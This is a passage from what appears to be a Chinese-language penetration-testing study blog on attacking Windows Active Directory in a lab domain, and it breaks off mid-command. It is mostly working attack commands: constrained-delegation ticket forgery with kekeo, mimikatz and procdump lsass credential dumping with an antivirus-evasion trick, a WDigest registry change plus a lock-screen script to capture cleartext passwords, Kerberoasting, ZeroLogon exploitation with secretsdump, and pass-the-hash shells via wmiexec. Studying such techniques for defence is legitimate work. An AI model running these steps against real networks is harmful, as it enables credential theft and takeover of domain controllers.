src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194336002.png\" alt=\"image-20220912194336002\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194412658.png\" alt=\"image-20220912194412658\"></p>\n</li>\n</ol>\n<ul>\n<li>因为有了黄金票据，可以直接使用 PsExec 反弹任意主机的 shell 且不需要密码，并且获取到的<mark>都是域控权限</mark></li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">PsExec64.exe \\\\ad1 cmd -accepteula<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194646559.png\" alt=\"image-20220912194646559\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194902540.png\" alt=\"image-20220912194902540\"></p>\n<h2 id=\"3-约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#3-约束委派攻击\">#</a> 3、约束委派攻击</h2>\n<h3 id=\"31-约束委派介绍\"><a class=\"markdownIt-Anchor\" href=\"#31-约束委派介绍\">#</a> 3.1 约束委派介绍</h3>\n<ul>\n<li>由于非约束委派的不安全性，引入了约束委派，对 kerberos 协议进行了扩展，加入 S4U，其中 S4U 支持两个子协议：Service for User to Self (S4U2Self) 和 Service for User to Proxy ( S4U2proxy )，这两个扩展都允许服务代表用户从 KDC 请求票证。 S4U2self 可以代表自身请求针对其自身的可转发的 Kerberos 服务票据 (ST1) ； S4U2proxy 可以以用户的名义请求其它服务的 ST2 ，约束委派就是限制了 S4U2proxy 扩展的范围。</li>\n</ul>\n<h3 id=\"32-约束委派流程\"><a class=\"markdownIt-Anchor\" href=\"#32-约束委派流程\">#</a> 3.2 约束委派流程</h3>\n<ul>\n<li>user 访问 serviceA，向 DC 发起 kerberos 认证，域控返回 user 的 TGT 和 ST1 票据，user 使用 ST1 票据对 serviceA 进行访问；<br>\n如果配置了 serviceA 到 serviceB 的约束委派，则 serviceA 能使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 DC；DC 返回 serviceA 一个用来访问 serviceB 的 ST2 票据，这样 serviceA 就能以用户的身份对 serviceB 发起访问。</li>\n</ul>\n<h3 id=\"33-攻击原理\"><a class=\"markdownIt-Anchor\" href=\"#33-攻击原理\">#</a> 3.3 攻击原理</h3>\n<ul>\n<li>由于服务用户只能获取某个用户（或主机）的服务的 ST1 而非 TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或 hash，那么就可以伪造 S4U 的请求，伪装成服务用户以任意用户的权限申请访问指定服务的 ST2。</li>\n</ul>\n<h3 id=\"34-攻击复现\"><a class=\"markdownIt-Anchor\" href=\"#34-攻击复现\">#</a> 3.4 攻击复现</h3>\n<ol>\n<li>\n<p>ad2 添加一个 websec 用户，并将其设置为服务用户</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">setspn -A cifs&#x2F;12server2.redteam.club websec #将websec用户加上spn标识变成服务用户<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913085413087.png\" alt=\"image-20220913085413087\"></p>\n<ul>\n<li>\n<p>已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务， 是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者 hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST</p>\n</li>\n<li>\n<p>约束用户 有 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 关键字段</p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913085924511.png\" alt=\"image-20220913085924511\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>12server2<strong> 普通域用户</strong>使用<strong> AdFind</strong> 工具使用命令查询存在的约束账户</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\"># 查询委派用户\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto\n# 查询委派主机\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090108654.png\" alt=\"image-20220913090108654\"></p>\n</li>\n<li>\n<p>12server2 使用 kekeo 请求服务用户的 TGT，需要已知<strong>明文密码或 hash</strong>，<mark>普通域用户权限即可</mark></p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">tgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;password:QWEasd123 &#x2F;ticket:test.kirbi  #使用明文密码请求\ntgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;NTLM:XXXXX #使用hash请求<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090338022.png\" alt=\"image-20220913090338022\"></p>\n</li>\n<li>\n<p>使用 kekeo 利用这个票据通过伪造 S4U 请求以 administrator 身份访问 websec 的 ST</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">tgs::s4u &#x2F;tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi &#x2F;user:Administrator@redteam.club &#x2F;service:cifs&#x2F;ad1.redteam.club\n#tgt：导出的服务用户TGT\n#user：要伪造的用户\n#service：服务&#x2F;目标主机.域名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090712392.png\" alt=\"image-20220913090712392\"></p>\n</li>\n<li>\n<p>这时候 kekeo 当前路径下会出现 administrator 的 ticket (用于访问 websec 的 CIFS 服务), 将这个凭证导入访问 websec 的 cifs 服务</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">keberos::ptt 凭证 #导入凭证<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913091104125.png\" alt=\"image-20220913091104125\"></p>\n</li>\n</ol>\n<h3 id=\"35-小结\"><a class=\"markdownIt-Anchor\" href=\"#35-小结\">#</a> 3.5 小结</h3>\n<ul>\n<li>当我们查询到约束委派的用户时，并知晓它的明文密码或 NTLM hash，才能利用工具请求它的 TGT；</li>\n<li>然后利用这个 TGT，伪造 S4U 请求以 administrator 身份去访问这个服务账号的 ST；</li>\n<li>这里可以生成任意权限身份的 ticket，我们是以 administrator 身份去访问的，所以生成的就是 administrator 的 ticket，这个就是 ST2；最后使用工具导入这个 ST2，那我们就能够成功访问域控；通常约束委派多数用于用户权限维持。</li>\n</ul>\n<h2 id=\"4-基于资源的约束委派-空\"><a class=\"markdownIt-Anchor\" href=\"#4-基于资源的约束委派-空\">#</a> 4、基于资源的约束委派 # 空</h2>\n<h1 id=\"获取域控权限\"><a class=\"markdownIt-Anchor\" href=\"#获取域控权限\">#</a> 获取域控权限</h1>\n<p>在域渗透中、作为渗透测试人员，获取域控的权限基本上可以获取整个内网的权限</p>\n<h2 id=\"1-高权限读取本地密码\"><a class=\"markdownIt-Anchor\" href=\"#1-高权限读取本地密码\">#</a> 1、高权限读取本地密码</h2>\n<ul>\n<li>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的 lsass.exe，可以通过 mimikatz 来读取到本地的明文密码</li>\n<li>利用条件：获取域主机的<mark>本地管理员权限</mark>，<strong>域管理员在本机上登录过</strong></li>\n<li>在无杀软的情况下使用<strong> mimikatz</strong> 直接读取</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">privilege::debug #提权\nsekurlsa::logonpasswords #导出hash\nmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt #直接在cmd执行导出到文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913201753215.png\" alt=\"image-20220913201753215\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913203750880.png\" alt=\"image-20220913203750880\"></p>\n<ul>\n<li>在有杀软的情况下可以通过 procdump+mimikatz 的方式进行绕过\n<ul>\n<li>procdump64.exe 是微软自带的工具，可直接搜索下载</li>\n</ul>\n</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">#1、导出lsass.exe\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n#2、将lsass.exe导出的dmp文件保存到本地，使用mimikatz读取\nmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; &gt; log.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>如果目标机器是 windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录即可读取明文</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">#添加注册表，设置UseLogonCredential设置为1\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f\n#利用一下powershell脚本进行锁屏\nFunction Lock-WorkStation\n&#123;\n    $signature &#x3D; @&quot;\n    [DllImport(&quot;user32.dll&quot;, SetLastError &#x3D; true)]\n    public static extern bool LockWorkStation();\n    &quot;@\n    $LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name\n    &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru\n    $LockWorkStation::LockWorkStation() | Out-Null\n&#125;\nLock-WorkStation<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>获取密码后可以通过 net use 命令进行明文连接，或使用 impacket 包下的 wmiexec.py 进行哈希连接，或导入 mimikatz 进行访问</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">#net use 明文连接\nnet use \\\\10.10.10.137\\ipc$ &quot;123456&quot; &#x2F;user:redteam\\administrator\n#wmiexec.py hash连接\npython3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137 &quot;whoami&quot;\npython3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"2-sysvol组策略获取密码\"><a class=\"markdownIt-Anchor\" href=\"#2-sysvol组策略获取密码\">#</a> 2、SYSVOL 组策略获取密码</h2>\n<ul>\n<li>由于需要多域环境，无法演示</li>\n</ul>\n<h2 id=\"3-kerberoasting\"><a class=\"markdownIt-Anchor\" href=\"#3-kerberoasting\">#</a> 3、Kerberoasting</h2>\n<ul>\n<li>\n<p>SPN 为服务主体名称，是服务实列 (MSSQL,HTTP 等) 的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的 SPN，如果 kerberos 服务票证的加密类型为 RC4_HMAC_MD5，就可以导出 TGS 对其进行离线破解，就有可能获取到域用户的密码</p>\n</li>\n<li>\n<p>原理：当域内某个用户去请求同域内的某个服务资源时，请求会首先被送达 KDS 的 AS 中进行身份认证，认证通过后 AS 会返回一个用用户密码 hash 加密的 TGT 给用户，然后用户再拿着 这个 TGT 向 TGS 去请求，TGS 会返回一个用对应服务账号的密码 hash 加密过 (RC4_HMAC_MD5) 的专门用于访问特定服务的服务票据，最后，用户只需拿这张服务票据去访问对应的服务资源即可，而问题就出在 TGS 返回服务票据，目标服务此时用的是一个域账号来运行的，那么 TGS 在向用户返回服务票据时，用户就可以拿到这张服务票据中的 hash，由于 TGS 服务票据加密算法已知，尝试穷举口令，模拟加密过程，生成 TGS 进行比较。如果 TGS 相同，代表口令正确，就能获得目标服务实例的明文口令</p>\n</li>\n<li>\n<p>使用 setspn 查询 spn (windows7 和 server2008 默认自带)，这是正常 kerberos 票据行为的一部分，因此查询 SPN 的操作很难被检测</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">setspn.exe -q *&#x2F;* #查询所有SPN\nsetspn.exe -T test -q *&#x2F;* #-T:查询指定域\n#以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915153555300.png\" alt=\"image-20220915153555300\"></p>\n<ul>\n<li>查询域内注册的 SPN (GetUserSPNs.vbs 脚本)</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">cscript GetUserSPNs.vbs<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915153729458.png\" alt=\"image-20220915153729458\"></p>\n<ul>\n<li>使用 powerview.ps1 脚本查询域内注册的 SPN</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\PowerView<span class=\"token punctuation\">.</span>ps1\n<span class=\"token function\">Get-NetUser</span> <span class=\"token operator\">-</span>spn <span class=\"token operator\">-</span>AdminCount<span class=\"token punctuation\">|</span><span class=\"token function\">Select</span> name<span class=\"token punctuation\">,</span>whencreated<span class=\"token punctuation\">,</span>pwdlastset<span class=\"token punctuation\">,</span>lastlogon<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915154339656.png\" alt=\"image-20220915154339656\"></p>\n<ul>\n<li>给 mySQL 服务注册 SPN</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">setspn -s mysql&#x2F;12server4.redteam.club:3306 test\n#-s：服务名&#x2F;主机全名 端口 用户名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>将 kerberos 的加密方式换成 RC4_HMAC_MD5—— 位于服务器管理 - 工具 - 组策略管理</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155150688.png\" alt=\"image-20220915155150688\"></p>\n<h3 id=\"31-使用mimikatz配合脚本穷举\"><a class=\"markdownIt-Anchor\" href=\"#31-使用mimikatz配合脚本穷举\">#</a> 3.1 使用 mimikatz 配合脚本穷举</h3>\n<ul>\n<li>请求指定的 TGS，完成之后 klist 就能查看相应的票据</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token function\">Add-Type</span> <span class=\"token operator\">-</span>AssemblyName System<span class=\"token punctuation\">.</span>IdentityModel\n<span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>IdentityModel<span class=\"token punctuation\">.</span>Tokens<span class=\"token punctuation\">.</span>KerberosRequestorSecurityToken <span class=\"token operator\">-</span>ArgumentList <span class=\"token string\">\"mysql/12server4.redteam.club:3306\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155619214.png\" alt=\"image-20220915155619214\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155736516.png\" alt=\"image-20220915155736516\"></p>\n<ul>\n<li>使用 mimikatz 导出票据</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">kerberos::list &#x2F;export<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155903221.png\" alt=\"image-20220915155903221\"></p>\n<ul>\n<li>将文件导入 kali 中使用 tgsrepcrack.py 破解密码</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">python3 tgsrepcrack.py wordlist.txt mssql.kirbi\n<span class=\"token comment\">#wordlist.txt是密码列表</span>\n<span class=\"token comment\">#mssql.kirbi是凭证文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915161335573.png\" alt=\"image-20220915161335573\"></p>\n<ul>\n<li><strong>如果服务的创建者是域管理员用户，有概率破解出域管理员的明文密码</strong></li>\n</ul>\n<h3 id=\"32-使用hashcat穷举\"><a class=\"markdownIt-Anchor\" href=\"#32-使用hashcat穷举\">#</a> 3.2 使用 hashcat 穷举</h3>\n<ul>\n<li>使用 <code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>  请求 TGS，在返回结果中提取出 TGS，输出的 TGS 可选择 John the Ripper 或 Hashcat 进行破解。</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token punctuation\">.</span>\\<span class=\"token function\">Invoke-Kerberoast</span> <span class=\"token operator\">-</span>OutputFormat Hashcat <span class=\"token comment\">#查看所有信息</span>\n<span class=\"token punctuation\">.</span>\\<span class=\"token function\">Invoke-Kerberoast</span> <span class=\"token operator\">-</span>OutputFormat Hashcat <span class=\"token punctuation\">|</span> <span class=\"token function\">Select</span> hash <span class=\"token punctuation\">|</span> <span class=\"token function\">ConvertTo-CSV</span> <span class=\"token operator\">-</span>NoTypeInformation <span class=\"token comment\">#只查看hash信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><mark><strong>powershell 未导出信息</strong></mark></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915162354441.png\" alt=\"image-20220915162354441\"></p>\n<ul>\n<li>使用 rubeus.exe 提取出 hash</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">Rubeus.exe kerberoast<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915162415801.png\" alt=\"image-20220915162415801\"></p>\n<ul>\n<li>使用 kali 自带 hashcat 对该 hash 进行穷举</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hashcat -m <span class=\"token number\">13100</span> kerberos.txt ./kerberoast-master/MimiPwds.txt -o found.txt --force\n<span class=\"token comment\">#未复现成功。。。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"4-内网协议ntlm之内网大杀器cve-2019-1040漏洞\"><a class=\"markdownIt-Anchor\" href=\"#4-内网协议ntlm之内网大杀器cve-2019-1040漏洞\">#</a> 4、内网协议 NTLM 之内网大杀器 CVE-2019-1040 漏洞</h2>\n<ul>\n<li>前面基于资源的域委派没学，后期补齐</li>\n</ul>\n<h2 id=\"5-cve-2020-1472-zerologon\"><a class=\"markdownIt-Anchor\" href=\"#5-cve-2020-1472-zerologon\">#</a> 5、CVE-2020-1472-ZeroLogon</h2>\n<h3 id=\"51-简介\"><a class=\"markdownIt-Anchor\" href=\"#51-简介\">#</a> 5.1 简介</h3>\n<ul>\n<li>Netlogon 使用的 AES 认证算法中的 vi 向量默认为 0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在 AD 中的管理员 password 设置为空</li>\n</ul>\n<h3 id=\"52-影响版本\"><a class=\"markdownIt-Anchor\" href=\"#52-影响版本\">#</a> 5.2 影响版本</h3>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)</p></blockquote>\n<h3 id=\"53-复现zerologin脚本\"><a class=\"markdownIt-Anchor\" href=\"#53-复现zerologin脚本\">#</a> 5.3 复现：zerologin 脚本</h3>\n<ul>\n<li>使用 zerologon_tester.py 检测是否存在漏洞</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 zerologon_tester.py ad01 10.10.10.137\n# 参数：域控主机名 IP<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915163807280.png\" alt=\"image-20220915163807280\"></p>\n<ul>\n<li>漏洞利用：置空 DC 的密码，脚本： git clone <a href=\"https://github.com/dirkjanm/CVE-2020-1472\">https://github.com/dirkjanm/CVE-2020-1472</a></li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME DC_IP_ADDR\npython3 cve-2020-1472-exploit.py ad01 10.10.10.137<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915163939943.png\" alt=\"image-20220915163939943\"></p>\n<ul>\n<li>使用 impacket 包中的 secretsdum.py 来获取相关的 HASh</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 secretsdump.py DOMAIN&#x2F;DC_NETBIOS_NAME$@DC_IP_ADDR -no-pass\npython3 secretsdump.py redteam.club&#x2F;ad01\\$@10.10.10.137 -no-pass<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164110430.png\" alt=\"image-20220915164110430\"></p>\n<ul>\n<li>使用 wmiexec.py 登录，获取一个 SHELL</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 wmiexec.py -hashes &lt;HASH&gt; DOMAIN&#x2F;DOMAIN_USER@DC_IP_ADDR\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a5843d3ee2da05158aaf16ecb3ba969b redteam.club&#x2F;administrator@10.10.10.137<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164319231.png\" alt=\"image-20220915164319231\"></p>\n<h3 id=\"54-恢复原hash\"><a class=\"markdownIt-Anchor\" href=\"#54-恢复原hash\">#</a> 5.4 恢复原 hash</h3>\n<ul>\n<li>在域控 shell 上导出 sam</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">reg save HKLM\\SYSTEM system.save\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SECURITY security.save\nget system.save\nget sam.save\nget security.save\ndel &#x2F;f system.save\ndel &#x2F;f sam.save\ndel &#x2F;f security.save\nexit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>使用 secretsdump.py 脚本获取文件中的原 hash</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164723706.png\" alt=\"image-20220915164723706\"></p>\n<ul>\n<li>reinstall_original_pw.py，执行以下命令，获取 SAM 中原来的 HASH 并恢复原 hash</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 reinstall_original_pw.py ad01 10.10.10.137<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164930152.png\" alt=\"image-20220915164930152\"></p>\n<ul>\n<li>使用 secretsdump.py 再次连接检测域密码</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 secretsdump.py ad01.redteam.club&#x2F;administrator@10.10.10.137 -hashes :42e2656ec24331269f82160ff5962387<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915165433050.png\" alt=\"image-20220915165433050\"></p>\n<h2 id=\"6-ms14-068漏洞提权\"><a class=\"markdownIt-Anchor\" href=\"#6-ms14-068漏洞提权\">#</a> 6、MS14-068 漏洞提权</h2>\n<h3 id=\"61-简介\"><a class=\"markdownIt-Anchor\" href=\"#61-简介\">#</a> 6.1 简介</h3>\n<ul>\n<li>server2008 有效 MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</li>\n</ul>\n<h3 id=\"62-复现\"><a class=\"markdownIt-Anchor\" href=\"#62-复现\">#</a> 6.2 复现</h3>\n<ul>\n<li>第一步：利用 MS14-068 伪造生成 TGT</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">MS14-068.exe -u 用户名@域名 -p 用户密码 -s 完整域ID -d 完整域地址\nMS14-068.exe -u 12server1@moonsec.fbi -p 123456 -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d 